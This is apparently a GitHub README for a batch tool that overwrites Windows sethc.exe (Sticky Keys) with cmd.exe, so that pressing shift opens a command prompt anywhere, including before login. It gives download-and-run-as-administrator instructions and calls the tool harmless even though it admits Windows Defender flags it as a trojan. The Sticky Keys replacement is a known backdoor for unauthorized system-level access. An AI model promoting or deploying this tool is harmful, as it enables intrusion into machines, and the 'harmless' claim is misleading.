# sethcexploit
A Simple batch program that overwrites sethc.exe with cmd.exe, which allows you to run cmd anywhere by spamming shift, Windows 7/8/10.

## Usage

Download and run exploit.exe (https://github.com/Sid12323/sethcexploit/blob/main/exploit.bat) as an administrator (right click, and then run as administrator).

## Other info
This will draw up a trojan flag in windows defender, and may get reset after a restart, but this should be harmless. It just replaces accessibilty features with a cmd dialog box.

Requires to be run as an Administrator
